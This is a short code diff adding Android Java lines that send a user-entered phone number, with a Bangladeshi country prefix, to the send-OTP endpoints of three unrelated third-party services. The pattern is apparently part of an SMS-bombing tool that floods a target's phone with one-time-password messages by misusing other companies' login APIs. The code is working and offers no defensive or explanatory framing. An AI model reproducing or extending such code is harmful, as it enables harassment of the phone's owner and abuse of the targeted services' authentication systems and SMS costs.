@@ -1,0 +1,9 @@
+uy = new Gson().fromJson("{\"os\":\"web\",\"mobile\":\"+88".concat(number.getText().toString().concat("\",\"language\":\"en\",\"deviceToken\":\"web\"}")), new TypeToken<HashMap<String, Object>>(){}.getType());
+z.setParams(uy, RequestNetworkController.REQUEST_BODY);
+z.startRequestNetwork(RequestNetworkController.POST, "https://api.osudpotro.com/api/v1/users/send_otp", "A", _z_request_listener);
+f = new Gson().fromJson("{\"country_code\":\"+880\",\"phone\":\"".concat(number.getText().toString().concat("\",\"fcm_token\":\"null\"}")), new TypeToken<HashMap<String, Object>>(){}.getType());
+z.setParams(f, RequestNetworkController.REQUEST_BODY);
+z.startRequestNetwork(RequestNetworkController.POST, "https://developer.quizgiri.xyz/api/v2.0/send-otp", "A", _z_request_listener);
+hiu = new Gson().fromJson("{\"msisdn\":\"88".concat(number.getText().toString().concat("\",\"operator\":\"all\"}")), new TypeToken<HashMap<String, Object>>(){}.getType());
+z.setParams(hiu, RequestNetworkController.REQUEST_BODY);
+z.startRequestNetwork(RequestNetworkController.POST, "https://api.bongo-solutions.com/auth/api/login/send-otp", "A", _z_request_listener);
